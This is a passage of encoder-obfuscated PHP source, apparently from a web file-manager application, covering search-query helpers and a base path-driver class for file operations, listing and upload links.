$dÄà…ªĞÇ˜ = array($Cê³ä¡Üêí[481] => array($Cê³ä¡Üêí[378], $cµ¾ İ»Í’[$Cê³ä¡Üêí[481]] . $cµ¾ İ»Í’[$Cê³ä¡Üêí[390]] . $Cê³ä¡Üêí[508])); $EèÆÒŒÌ¶ = $this->field($Cê³ä¡Üêí[390])->cache(null, 600)->where($dÄà…ªĞÇ˜)->count(); if ($EèÆÒŒÌ¶ > $E›ŞÅÛÊ®ù) { return $this->_listSearchChildrenNear($AÖ…‹¶á„, $E›ŞÅÛÊ®ù); } goto AƒÅ‘Ü©‘ì; AÍ³öíÑê: $Cê³ä¡Üêí =& $_SERVER[ç]; $bšê®‹Ø˜§ = array(); $cµ¾ İ»Í’ = $this->sourceInfo($AÖ…‹¶á„); goto bç†‚Ÿë È; AƒÅ‘Ü©‘ì: $eòƒ·ğ¤ºá = $this->field($Cê³ä¡Üêí[390])->where($dÄà…ªĞÇ˜)->select(); $bšê®‹Ø˜§ = array_to_keyvalue($eòƒ·ğ¤ºá, $Cê³ä¡Üêí[33], $Cê³ä¡Üêí[390]); return $bšê®‹Ø˜§; goto Bì¡â––Ç·; Bì¡â––Ç·: } private function _listSearchChildrenNear($b¹„¤„¼ê, $cŸòõïš¸î) { goto eÔä´¥ñŒ; AÂ¸£’¨ä÷: if (!$B‚éš·’‘Ñ) { return $EÖ¿×œÀ¡“; } $DÏ™ÛŠÀ  = array($F“Èóš áš[472] => array($F“Èóš áš[7], $B‚éš·’‘Ñ)); $d‰‘ğÚ– = $this->field($F“Èóš áš[1902])->where($DÏ™ÛŠÀ )->limit($cŸòõïš¸î)->select(); goto B®Ú”ëÊô; B®Ú”ëÊô: $EÖ¿×œÀ¡“ = array_merge($EÖ¿×œÀ¡“, array_to_keyvalue($d‰‘ğÚ–, $F“Èóš áš[33], $F“Èóš áš[390])); $EÖ¿×œÀ¡“ = array_slice($EÖ¿×œÀ¡“, 0, $cŸòõïš¸î); return $EÖ¿×œÀ¡“; goto e¤¸Ë©Ñ¸È; b÷¶‚©ŠÂ: $d‰‘ğÚ– = $this->field($F“Èóš áš[1902])->where($DÏ™ÛŠÀ )->select(); $B‚éš·’‘Ñ = array_to_keyvalue(array_filter_by_field($d‰‘ğÚ–, $F“Èóš áš[397], $F“Èóš áš[86]), $F“Èóš áš[33], $F“Èóš áš[390]); $EÖ¿×œÀ¡“ = array_merge($EÖ¿×œÀ¡“, array_to_keyvalue($d‰‘ğÚ–, $F“Èóš áš[33], $F“Èóš áš[390])); goto AÂ¸£’¨ä÷; eÔä´¥ñŒ: $F“Èóš áš =& $_SERVER[ç]; $EÖ¿×œÀ¡“ = array(); $DÏ™ÛŠÀ  = array($F“Èóš áš[472] => $b¹„¤„¼ê); goto b÷¶‚©ŠÂ; e¤¸Ë©Ñ¸È: } private function _listSearchBindPinyin($B¿’Ïß¬Äã, &$B¥ŠÔÙ‰«Û, &$Dâêùµ…İ ) { goto FÏ™¡Œ’Ÿö; A²Š™Èˆ¸: $C éÜ–ÍÕ› = "\x4c\x45\106\x54\40\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\157\x5f\x73\x6f\165\162\x63\145\x5f\x6d\145\x74\x61\x20\155\145\164\141\40\x6f\x6e\x20\x73\x6f\x75\162\143\145\56\163\157\x75\162\143\145\x49\104\x20\x3d\x20\x6d\x65\x74\141\x2e\163\x6f\x75\162\x63\145\x49\104"; $E«å†£“İ§ = array(); $Dâêùµ…İ  = str_replace(array($f‚ö…ï¹‡Ä[227], $f‚ö…ï¹‡Ä[50], $f‚ö…ï¹‡Ä[1903]), $f‚ö…ï¹‡Ä[33], $Dâêùµ…İ ); goto d°èêì•Û; D­»ëÇ£…: foreach ($B¥ŠÔÙ‰«Û as $F‚î×º£Ò => $dŠ†õà ¾‹) { $E«å†£“İ§[$f‚ö…ï¹‡Ä[1904] . $F‚î×º£Ò] = $dŠ†õà ¾‹; } foreach ($BÛØ×Ê¦ïƒ as $F‚£ÛÔ­”—) { $E«å†£“İ§[] = array($f‚ö…ï¹‡Ä[1906] => $F‚£ÛÔ­”—, $f‚ö…ï¹‡Ä[925] => $f‚ö…ï¹‡Ä[1742], array($f‚ö…ï¹‡Ä[1907] => $F‚£ÛÔ­”—, $f‚ö…ï¹‡Ä[1908] => array($f‚ö…ï¹‡Ä[7], array($f‚ö…ï¹‡Ä[438], $f‚ö…ï¹‡Ä[437])))); } $this->join($C éÜ–ÍÕ›); goto aØÀŠ‚˜…ó; d°èêì•Û: $Dâêùµ…İ  = $f‚ö…ï¹‡Ä[1904] . str_replace($f‚ö…ï¹‡Ä[47], $f‚ö…ï¹‡Ä[1905], $Dâêùµ…İ ); $BÛØ×Ê¦ïƒ = $B¥ŠÔÙ‰«Û[$f‚ö…ï¹‡Ä[28]]; unset($B¥ŠÔÙ‰«Û[$f‚ö…ï¹‡Ä[28]]); goto D­»ëÇ£…; aØÀŠ‚˜…ó: $B¥ŠÔÙ‰«Û = $E«å†£“İ§; goto c¢ –±¼ğ; FÏ™¡Œ’Ÿö: $f‚ö…ï¹‡Ä =& $_SERVER[ç]; if (!isset($B¿’Ïß¬Äã[$f‚ö…ï¹‡Ä[1738]]) || !$B¿’Ïß¬Äã[$f‚ö…ï¹‡Ä[1738]]) { return; } if (!Input::check($B¿’Ïß¬Äã[$f‚ö…ï¹‡Ä[1738]], $f‚ö…ï¹‡Ä[314]) || strlen($B¿’Ïß¬Äã[$f‚ö…ï¹‡Ä[1738]]) < 2) { return; } goto A²Š™Èˆ¸; c¢ –±¼ğ: } private function _parseSearchWhere($d„È¡Ìì§) { goto EÊ‡ÚÉ¹íå; aŞàîÓ÷ö×: if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[1738]]) && trim($d„È¡Ìì§[$aÔóùùØŞƒ[1738]])) { $D¢Áğ×œ«© = trim($d„È¡Ìì§[$aÔóùùØŞƒ[1738]]); $CÈ¦„§—ô = explode($aÔóùùØŞƒ[50], $D¢Áğ×œ«©); if (strlen($D¢Áğ×œ«©) > 2 && (substr($D¢Áğ×œ«©, 0, 1) == $aÔóùùØŞƒ[115] && substr($D¢Áğ×œ«©, -1) == $aÔóùùØŞƒ[115]) || substr($D¢Áğ×œ«©, 0, 1) == $aÔóùùØŞƒ[55] && substr($D¢Áğ×œ«©, -1) == $aÔóùùØŞƒ[55]) { $D¢Áğ×œ«© = substr($D¢Áğ×œ«©, 1, -1); $CÈ¦„§—ô = array($D¢Áğ×œ«©); } $e©…‰‚”˜œ[$aÔóùùØŞƒ[28]] = array(array($aÔóùùØŞƒ[507], $aÔóùùØŞƒ[1740] . $D¢Áğ×œ«© . $aÔóùùØŞƒ[1740])); if (count($CÈ¦„§—ô) > 1) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[28]] = array(); foreach ($CÈ¦„§—ô as $Aõäæá¼Ó) { if (!trim($Aõäæá¼Ó)) { continue; } $e©…‰‚”˜œ[$aÔóùùØŞƒ[28]][] = array($aÔóùùØŞƒ[507], $aÔóùùØŞƒ[1740] . trim($Aõäæá¼Ó) . $aÔóùùØŞƒ[1740]); } } } return $e©…‰‚”˜œ; goto dŸ÷©æ„¶Û; Eß¯ÃÉØÎ’: if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[557]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[557]]) { $e©…‰‚”˜œ[] = array($aÔóùùØŞƒ[428] => $d„È¡Ìì§[$aÔóùùØŞƒ[557]], $aÔóùùØŞƒ[426] => $d„È¡Ìì§[$aÔóùùØŞƒ[557]], $aÔóùùØŞƒ[925] => $aÔóùùØŞƒ[1742]); } if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[399]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[399]]) { $ešëà£“›Œ = $d„È¡Ìì§[$aÔóùùØŞƒ[399]]; if ($ešëà£“›Œ == $aÔóùùØŞƒ[76]) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[397]] = 1; } else { if ($ešëà£“›Œ == $aÔóùùØŞƒ[1912]) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[397]] = 0; } else { if ($ešëà£“›Œ) { $ešëà£“›Œ = is_array($ešëà£“›Œ) ? $ešëà£“›Œ : explode($aÔóùùØŞƒ[47], $ešëà£“›Œ); $e©…‰‚”˜œ[$aÔóùùØŞƒ[399]] = array($aÔóùùØŞƒ[405], $ešëà£“›Œ); $e©…‰‚”˜œ[$aÔóùùØŞƒ[397]] = 0; } } } } if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[472]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[472]]) { $AÀËµİØíÖ = $this->sourceInfo($d„È¡Ìì§[$aÔóùùØŞƒ[472]]); $e©…‰‚”˜œ[$aÔóùùØŞƒ[548]] = array($aÔóùùØŞƒ[507], $AÀËµİØíÖ[$aÔóùùØŞƒ[481]] . $d„È¡Ìì§[$aÔóùùØŞƒ[472]] . $aÔóùùØŞƒ[508]); } goto aŞàîÓ÷ö×; EÊ‡ÚÉ¹íå: $aÔóùùØŞƒ =& $_SERVER[ç]; $e©…‰‚”˜œ = array(); if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[708]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[708]]) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[83]] = array($aÔóùùØŞƒ[1909], $d„È¡Ìì§[$aÔóùùØŞƒ[708]]); } goto fø¹‡ôËí ; fø¹‡ôËí : if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[470]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[470]]) { $EÒ¨¥»Ò› = array($aÔóùùØŞƒ[1910], $d„È¡Ìì§[$aÔóùùØŞƒ[470]]); if ($e©…‰‚”˜œ[$aÔóùùØŞƒ[83]]) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[83]] = array($e©…‰‚”˜œ[$aÔóùùØŞƒ[83]], $EÒ¨¥»Ò›, $aÔóùùØŞƒ[1911]); } else { $e©…‰‚”˜œ[$aÔóùùØŞƒ[83]] = $EÒ¨¥»Ò›; } } if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[1900]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[1900]] > 0) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[77]] = array($aÔóùùØŞƒ[1909], $d„È¡Ìì§[$aÔóùùØŞƒ[1900]]); } if (isset($d„È¡Ìì§[$aÔóùùØŞƒ[1901]]) && $d„È¡Ìì§[$aÔóùùØŞƒ[1901]]) { $EÒ¨¥»Ò› = array($aÔóùùØŞƒ[1910], $d„È¡Ìì§[$aÔóùùØŞƒ[1901]]); if ($e©…‰‚”˜œ[$aÔóùùØŞƒ[77]]) { $e©…‰‚”˜œ[$aÔóùùØŞƒ[77]] = array($e©…‰‚”˜œ[$aÔóùùØŞƒ[77]], $EÒ¨¥»Ò›, $aÔóùùØŞƒ[1911]); } else { $e©…‰‚”˜œ[$aÔóùùØŞƒ[77]] = $EÒ¨¥»Ò›; } } goto Eß¯ÃÉØÎ’; dŸ÷©æ„¶Û: } } goto AàÈ¿ö±©; D¡µ«Á›±’: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public function __construct() { $C‹·á»¡ì¼ =& $_SERVER[ç]; $this->objectDriver = array($C‹·á»¡ì¼[57], $C‹·á»¡ì¼[58], $C‹·á»¡ì¼[59], $C‹·á»¡ì¼[60], $C‹·á»¡ì¼[61], $C‹·á»¡ì¼[62], $C‹·á»¡ì¼[63], $C‹·á»¡ì¼[64]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($bÏÏ›‰’¸) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($bÏÏ›‰’¸, $_SERVER[ç][8]); } return $bÏÏ›‰’¸; } public function iconvApp($B¤Ğ¡§¢–ƒ) { return $B¤Ğ¡§¢–ƒ; } public function iconvSystem($EÌ‘à”Æ™) { return $EÌ‘à”Æ™; } public function iconvTo($D–àó±ÎÓ, $FÅµèèíÈ, $FÓˆæë“) { goto aÀÏ§ÍğòÙ; DŸå‹Ã£Û™: $d¦Ìª ¶ó = $FÅµèèíÈ . $eœ†áîÌ›ô[66] . $FÓˆæë“ . $eœ†áîÌ›ô[67] . $D–àó±ÎÓ; if (isset($E»Ü…©éµÙ[$d¦Ìª ¶ó])) { return $E»Ü…©éµÙ[$d¦Ìª ¶ó]; } if (function_exists($eœ†áîÌ›ô[68])) { $A‚¯Î½ã™÷ = @mb_convert_encoding($D–àó±ÎÓ, $FÓˆæë“, $FÅµèèíÈ); } else { $A‚¯Î½ã™÷ = @iconv($FÅµèèíÈ, $FÓˆæë“, $D–àó±ÎÓ); } goto CÚìö™à’ó; aÀÏ§ÍğòÙ: $eœ†áîÌ›ô =& $_SERVER[ç]; if (!$D–àó±ÎÓ || !function_exists($eœ†áîÌ›ô[65])) { return $D–àó±ÎÓ; } static $E»Ü…©éµÙ = array(); goto DŸå‹Ã£Û™; eíé£­®Ü: $E»Ü…©éµÙ[$FÓˆæë“ . $eœ†áîÌ›ô[66] . $FÅµèèíÈ . $eœ†áîÌ›ô[67] . $D–àó±ÎÓ] = $D–àó±ÎÓ; $E»Ü…©éµÙ[$FÓˆæë“ . $eœ†áîÌ›ô[66] . $FÅµèèíÈ . $eœ†áîÌ›ô[67] . $A‚¯Î½ã™÷] = $D–àó±ÎÓ; $E»Ü…©éµÙ[$FÅµèèíÈ . $eœ†áîÌ›ô[66] . $FÓˆæë“ . $eœ†áîÌ›ô[67] . $A‚¯Î½ã™÷] = $A‚¯Î½ã™÷; goto b©øÔà¶; CÚìö™à’ó: $A‚¯Î½ã™÷ = $A‚¯Î½ã™÷ ? $A‚¯Î½ã™÷ : $D–àó±ÎÓ; if (strstr($A‚¯Î½ã™÷, $eœ†áîÌ›ô[69])) { $A‚¯Î½ã™÷ = str_replace($eœ†áîÌ›ô[69], $eœ†áîÌ›ô[70], $A‚¯Î½ã™÷); } $E»Ü…©éµÙ[$FÅµèèíÈ . $eœ†áîÌ›ô[66] . $FÓˆæë“ . $eœ†áîÌ›ô[67] . $D–àó±ÎÓ] = $A‚¯Î½ã™÷; goto eíé£­®Ü; b©øÔà¶: return $A‚¯Î½ã™÷; goto aŞ«°–Ã±™; aŞ«°–Ã±™: } public function getPathInner($A¿©Æ´““) { $Aä¡¶¼ãÑÇ = IO::init($A¿©Æ´““); return $Aä¡¶¼ãÑÇ->path; } public function getPathOuter($B±ÌÍ£ˆÚ) { $FĞèÄ¼›÷È =& $_SERVER[ç]; $E‚†Ü‰•˜¡ = strlen(trim($this->pathBase, $FĞèÄ¼›÷È[8])); $B±ÌÍ£ˆÚ = substr(trim($B±ÌÍ£ˆÚ, $FĞèÄ¼›÷È[8]), $E‚†Ü‰•˜¡); return $this->pathDriver . $FĞèÄ¼›÷È[8] . ltrim($B±ÌÍ£ˆÚ, $FĞèÄ¼›÷È[8]); } public function isParentOf($có¯ï¶­Àß, $BÑğÚöî¡) { $Bí½ÃèÍë£ =& $_SERVER[ç]; $có¯ï¶­Àß = rtrim(strtolower($có¯ï¶­Àß), $Bí½ÃèÍë£[8]) . $Bí½ÃèÍë£[8]; $BÑğÚöî¡ = rtrim(strtolower($BÑğÚöî¡), $Bí½ÃèÍë£[8]) . $Bí½ÃèÍë£[8]; $B‚Œ÷˜ù¯Ç = strpos($BÑğÚöî¡, $có¯ï¶­Àß) === 0; return $B‚Œ÷˜ù¯Ç; } public function getType() { $eè·˜«ÌÀÒ =& $_SERVER[ç]; $cª“ùÙ«Ğ = str_replace($eè·˜«ÌÀÒ[71], $eè·˜«ÌÀÒ[33], get_class($this)); return strtolower($cª“ùÙ«Ğ); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($FÉÙ±·…¬, $F”ó«²¤) { $f‰†œÃ®÷‹ =& $_SERVER[ç]; $eùæ¢‡’öŠ = rtrim($FÉÙ±·…¬, $f‰†œÃ®÷‹[8]) . $f‰†œÃ®÷‹[8] . $F”ó«²¤; $Aì…Çğó„õ = $this->exist($eùæ¢‡’öŠ); return $Aì…Çğó„õ ? $eùæ¢‡’öŠ : !1; } public function setModifyTime($a„Â¥´Ñ÷Â, $A°¬ÔŒ–›¸ = '') { } public function renameObject($a©öƒ¦òÔà, $e™‘Âİè„) { goto EõŠ¥›šÈ; EõŠ¥›šÈ: $d…ç¸ÌÔ¸ =& $_SERVER[ç]; $B£èµ„Ó = $e™‘Âİè„; Hook::trigger($d…ç¸ÌÔ¸[72], $this, $a©öƒ¦òÔà, $this, $this->pathFather($a©öƒ¦òÔà) . $e™‘Âİè„); goto FÛµ¢ÅÊ˜; C‘«ÖñÏ—½: return $f‘ŒÖ¢Â¹ ? $e™‘Âİè„ : !1; goto b‘…»¾‚å; FÛµ¢ÅÊ˜: $a©öƒ¦òÔà = $this->getPathOuter($a©öƒ¦òÔà); $e™‘Âİè„ = $this->pathFather($a©öƒ¦òÔà) . $e™‘Âİè„; if (IO::isFile($a©öƒ¦òÔà)) { $f‘ŒÖ¢Â¹ = IO::copy($a©öƒ¦òÔà, $this->pathFather($a©öƒ¦òÔà), REPEAT_RENAME_FOLDER, $B£èµ„Ó); if ($f‘ŒÖ¢Â¹) { IO::remove($a©öƒ¦òÔà); } } else { $f‘ŒÖ¢Â¹ = IO::mkdir($e™‘Âİè„); if (!$f‘ŒÖ¢Â¹) { return !1; } $dòë·¥™ Ö = IO::listPath($a©öƒ¦òÔà, !0); $a‡œÛŠ™¤Ñ = array_merge($dòë·¥™ Ö[$d…ç¸ÌÔ¸[73]], $dòë·¥™ Ö[$d…ç¸ÌÔ¸[74]]); foreach ($a‡œÛŠ™¤Ñ as $f¶âç¡æ–›) { IO::move($f¶âç¡æ–›[$d…ç¸ÌÔ¸[75]], $e™‘Âİè„, REPEAT_RENAME_FOLDER); } IO::remove($a©öƒ¦òÔà); } goto C‘«ÖñÏ—½; b‘…»¾‚å: } public function tempFile($B‘µ£Û‰‹ = '', $Fç÷ˆ¹¾Áå = '') { goto C¬Ä¹¦Äâ“; EîÓ“ßÅ¤³: return $fÁµĞí‘‘Š; goto B²‘”™óÅ“; C¬Ä¹¦Äâ“: if (!$B‘µ£Û‰‹) { $B‘µ£Û‰‹ = rand_string(15); } $aÑÃÁÀ¯òé = TEMP_FILES . rand_string(15) . $_SERVER[ç][8]; @mkdir($aÑÃÁÀ¯òé, 511, !0); goto F¥µÉ†ÛŠ; F¥µÉ†ÛŠ: $fÁµĞí‘‘Š = $aÑÃÁÀ¯òé . $B‘µ£Û‰‹; @touch($fÁµĞí‘‘Š); if ($Fç÷ˆ¹¾Áå) { file_put_contents($fÁµĞí‘‘Š, $Fç÷ˆ¹¾Áå); } goto EîÓ“ßÅ¤³; B²‘”™óÅ“: } public function tempFileRemve($E³¼®‹‚Ë) { @unlink($E³¼®‹‚Ë); @rmdir($this->pathFather($E³¼®‹‚Ë)); } public function mkfile($fÌâÏĞÊóÁ, $DÌ »ÕàÎá = '', $a“—½ÈÑ×² = REPEAT_RENAME) { } public function mkdir($BÍê¿ĞŒÆ, $c¾Äá°ÄÏ¡ = REPEAT_SKIP) { } public function delFile($c¶áÆé²¨«) { } public function delFolder($f¯†ŞÂ¥¬Ç) { } public function copyFile($bĞÃ„ÏÏç‡, $däÜïğ‹ÓÕ) { } public function moveFile($F¨„¸£Û™Î, $eçÈÑºñ§ª) { } public function remove($aœâ£¥Ìğ) { if ($this->isFile($aœâ£¥Ìğ)) { return $this->delFile($aœâ£¥Ìğ); } return $this->delFolder($aœâ£¥Ìğ); } public function rename($dŒ¥ã©³”ñ, $D¢¼ÄÊŠÌØ) { } public function exist($bÒ¶ê—ßš) { } public function findByHash($f¸¬¡»êÌ’ = '', $a¤ØÔë’‚  = '') { return !1; } public function isFile($eóÊø’ëœª) { } public function isFolder($eŞÖÀêŸ) { } public function size($EÖ™òˆ…˜¸) { } public function info($cîŞèğ¦š÷) { } public function infoSimple($C½íë Çƒ) { return $this->info($C½íë Çƒ); } public function infoAuth($eŒßÈÅ¶ÅŒ) { return $this->info($eŒßÈÅ¶ÅŒ); } public function infoFull($F³§¦Ë) { return $this->info($F³§¦Ë); } public function infoWithChildren($b¸Å„Î›ø) { $bš™äŞ«ßÀ =& $_SERVER[ç]; static $DïŠÙÖÍ = array(); if (isset($DïŠÙÖÍ[$b¸Å„Î›ø])) { return $DïŠÙÖÍ[$b¸Å„Î›ø]; } $FØ­µ®Ğì = $this->info($b¸Å„Î›ø); if ($FØ­µ®Ğì && $FØ­µ®Ğì[$bš™äŞ«ßÀ[29]] == $bš™äŞ«ßÀ[76]) { $f¢êÉöáÎ = array($bš™äŞ«ßÀ[77] => 0, $bš™äŞ«ßÀ[78] => 0, $bš™äŞ«ßÀ[79] => 0); $this->infoChildren($b¸Å„Î›ø, $f¢êÉöáÎ); $FØ­µ®Ğì[$bš™äŞ«ßÀ[77]] = $f¢êÉöáÎ[$bš™äŞ«ßÀ[77]]; $FØ­µ®Ğì[$bš™äŞ«ßÀ[80]] = array($bš™äŞ«ßÀ[81] => $f¢êÉöáÎ[$bš™äŞ«ßÀ[78]], $bš™äŞ«ßÀ[82] => $f¢êÉöáÎ[$bš™äŞ«ßÀ[79]]); $DïŠÙÖÍ[$b¸Å„Î›ø] = $FØ­µ®Ğì; } return $FØ­µ®Ğì; } public function listPath($aÛ˜ôµÊå’, $e¡À¢‡íù˜ = false) { } public function has($DÂŸò·†ˆ–, $eÕÙøáœÔ = false, $a¡ª†‚Ëç” = false) { } public function canRead($d÷…·³È¿) { } public function canWrite($aàŠ½ëÛğ) { } public function getContent($A÷¯›ó²‹¡) { } public function setContent($c‡°œ­, $E”‡Ğœˆö± = '') { } protected function infoChildren($DÀÚÊ÷É÷, &$dÑ”ˆ¤¼Ë) { $cîÖšè¹“‘ =& $_SERVER[ç]; check_abort_echo(); $a‰ùÎÁ„¾ˆ = $this->listPath($DÀÚÊ÷É÷, !0); $a‰ùÎÁ„¾ˆ = array_merge($a‰ùÎÁ„¾ˆ[$cîÖšè¹“‘[74]], $a‰ùÎÁ„¾ˆ[$cîÖšè¹“‘[73]]); foreach ($a‰ùÎÁ„¾ˆ as $e¸†ƒ•ÜÜ¨) { if ($e¸†ƒ•ÜÜ¨[$cîÖšè¹“‘[29]] == $cîÖšè¹“‘[76]) { $dÑ”ˆ¤¼Ë[$cîÖšè¹“‘[79]]++; $FÒÍ‚ƒÕ‚é = $this->getPathInner($e¸†ƒ•ÜÜ¨[$cîÖšè¹“‘[75]]); $this->infoChildren($FÒÍ‚ƒÕ‚é, $dÑ”ˆ¤¼Ë); } else { $dÑ”ˆ¤¼Ë[$cîÖšè¹“‘[78]]++; $dÑ”ˆ¤¼Ë[$cîÖšè¹“‘[77]] += $e¸†ƒ•ÜÜ¨[$cîÖšè¹“‘[77]]; } } } public function fileSubstr($D…š‹ç‹Í„, $D¥ìâ›±ÏÇ, $FˆÙƒ»¹) { } public function listAll($a¿ñŸÜá‡Ã) { } public function listAllMake($fƒƒà¯Ç®ù, &$a›¦¤ùºÒ) { $f‡¤ØÓ¥Íà =& $_SERVER[ç]; check_abort_echo(); $cœâè¤†‚ƒ = $this->listPath($fƒƒà¯Ç®ù, !0); if (!$cœâè¤†‚ƒ) { return; } $då¼¾¨Ú‹ = array_merge($cœâè¤†‚ƒ[$f‡¤ØÓ¥Íà[74]], $cœâè¤†‚ƒ[$f‡¤ØÓ¥Íà[73]]); foreach ($då¼¾¨Ú‹ as $e˜â‹—ø’±) { goto cŠ††²¬Ö¿; Cğò¬²ÂÍ: $this->listAllMake($e˜â‹—ø’±[$f‡¤ØÓ¥Íà[75]], $a›¦¤ùºÒ); goto c‹•ÓÑ½±; BÚùØÂ±‹é: if (isset($e˜â‹—ø’±[$f‡¤ØÓ¥Íà[83]])) { $bÎ¾ª„¡ìƒ[$f‡¤ØÓ¥Íà[83]] = $e˜â‹—ø’±[$f‡¤ØÓ¥Íà[83]]; } if (!$E¸¡ÒÁô§Ö) { $a›¦¤ùºÒ[] = $bÎ¾ª„¡ìƒ; continue; } $a›¦¤ùºÒ[] = $bÎ¾ª„¡ìƒ; goto Cğò¬²ÂÍ; cŠ††²¬Ö¿: $E¸¡ÒÁô§Ö = $e˜â‹—ø’±[$f‡¤ØÓ¥Íà[29]] == $f‡¤ØÓ¥Íà[76]; $bÎ¾ª„¡ìƒ = array($f‡¤ØÓ¥Íà[75] => $e˜â‹—ø’±[$f‡¤ØÓ¥Íà[75]], $f‡¤ØÓ¥Íà[76] => $E¸¡ÒÁô§Ö); if (isset($e˜â‹—ø’±[$f‡¤ØÓ¥Íà[77]])) { $bÎ¾ª„¡ìƒ[$f‡¤ØÓ¥Íà[77]] = $e˜â‹—ø’±[$f‡¤ØÓ¥Íà[77]]; } goto BÚùØÂ±‹é; c‹•ÓÑ½±: } } public function listAllSimple($DÉ›»Å„À×) { $fÌ”ò´ğïò =& $_SERVER[ç]; $F–¾İ®ë = array(); $D¦•ìŞ×¯Û = $this->listAll($DÉ›»Å„À×); $C¶´ìÈßºê = $this->getPathOuter($DÉ›»Å„À×); foreach ($D¦•ìŞ×¯Û as $aºÌ‡³©½) { goto d™Ïå¼™Êš; aéˆö·ËŒÎ: if (!$aºÌ‡³©½[$fÌ”ò´ğïò[76]]) { $D³‡ÁÀô–õ[$fÌ”ò´ğïò[85]] = $cï±ÆÀ—µ; } $F–¾İ®ë[] = $D³‡ÁÀô–õ; goto a•éâøèÜ†; d™Ïå¼™Êš: $cï±ÆÀ—µ = $aºÌ‡³©½[$fÌ”ò´ğïò[75]]; $A¸’ÆÃçÁ = $aºÌ‡³©½[$fÌ”ò´ğïò[75]]; if (isset($aºÌ‡³©½[$fÌ”ò´ğïò[84]])) { $cï±ÆÀ—µ = $aºÌ‡³©½[$fÌ”ò´ğïò[84]][$fÌ”ò´ğïò[75]]; $aºÌ‡³©½[$fÌ”ò´ğïò[77]] = $aºÌ‡³©½[$fÌ”ò´ğïò[84]][$fÌ”ò´ğïò[77]]; $aºÌ‡³©½[$fÌ”ò´ğïò[83]] = $aºÌ‡³©½[$fÌ”ò´ğïò[84]][$fÌ”ò´ğïò[83]]; } else { $A¸’ÆÃçÁ = substr($aºÌ‡³©½[$fÌ”ò´ğïò[75]], strlen(get_path_father($C¶´ìÈßºê))); $A¸’ÆÃçÁ = $fÌ”ò´ğïò[8] . ltrim($A¸’ÆÃçÁ, $fÌ”ò´ğïò[8]); } goto C”ñŠ¡‹æ; C”ñŠ¡‹æ: $D³‡ÁÀô–õ = array($fÌ”ò´ğïò[75] => $A¸’ÆÃçÁ, $fÌ”ò´ğïò[76] => $aºÌ‡³©½[$fÌ”ò´ğïò[76]]); if (isset($aºÌ‡³©½[$fÌ”ò´ğïò[77]]) && !$aºÌ‡³©½[$fÌ”ò´ğïò[76]]) { $D³‡ÁÀô–õ[$fÌ”ò´ğïò[77]] = $aºÌ‡³©½[$fÌ”ò´ğïò[77]]; } if (isset($aºÌ‡³©½[$fÌ”ò´ğïò[83]])) { $D³‡ÁÀô–õ[$fÌ”ò´ğïò[83]] = $aºÌ‡³©½[$fÌ”ò´ğïò[83]]; } goto aéˆö·ËŒÎ; a•éâøèÜ†: } return $F–¾İ®ë; } public function upload($cÜŞÁßò, $DŒ‡„â‹®Ë, $d‹îÆ‚ˆêŞ = false, $E¿š›×ÍÎĞ = REPEAT_REPLACE) { } public function uploadFileByID($e„ÈÏ’œ¢„, $EÂß„ó¿•’, $F´©‰†Êğë) { } public function uploadFileByPath($EçŒ‡‚ÍÃ, $ašè±ƒòŠ, $E¬ìæ¢ÀÍ• = array()) { } public function isUploadServer() { $dÍê‰ïï©ó =& $_SERVER[ç]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $dÍê‰ïï©ó[86]) { return !0; } return $GLOBALS[$dÍê‰ïï©ó[6]][$dÍê‰ïï©ó[87]][$dÍê‰ïï©ó[88]]; } public function isFileOutServer() { $dÂß¶ŠÄøÆ =& $_SERVER[ç]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $dÂß¶ŠÄøÆ[86]) { return !0; } return $GLOBALS[$dÂß¶ŠÄøÆ[6]][$dÂß¶ŠÄøÆ[87]][$dÂß¶ŠÄøÆ[89]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($B¡ËË£‹ØÉ) { $d·ŞÔƒ´ïÑ =& $_SERVER[ç]; if (!$this->isCdnHost()) { return $B¡ËË£‹ØÉ; } return str_replace(trim(get_url_root($B¡ËË£‹ØÉ), $d·ŞÔƒ´ïÑ[8]), trim($this->cdnHost, $d·ŞÔƒ´ïÑ[8]), $B¡ËË£‹ØÉ); } public function uploadLink($fòÎ¼Ì§­, $d÷Ú„¢çÙ– = 0) { goto a‘—šªğÛç; c›è¤¯Æç: if (!in_array($e â·‡¨Ä, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $C’ãö÷šŒÙ = 1024 * 1024 * 10; goto C”œÈ¥À”; B¢˜²¤Àù¬: if ($d÷Á‘Òí’Ÿ) { $d÷Á‘Òí’Ÿ[$dæ÷ñº«¦[92]] = $fòÎ¼Ì§­; $d÷Á‘Òí’Ÿ[$dæ÷ñº«¦[93]] = $e â·‡¨Ä; } return $d÷Á‘Òí’Ÿ; goto F¤´ÖÚ»ãğ; a‘—šªğÛç: $dæ÷ñº«¦ =& $_SERVER[ç]; if ($this->isUploadServer()) { return; } $e â·‡¨Ä = $this->getType(); goto c›è¤¯Æç; C”œÈ¥À”: $DîÄ§ö†„ = $d÷Ú„¢çÙ– <= $C’ãö÷šŒÙ ? $dæ÷ñº«¦[90] : 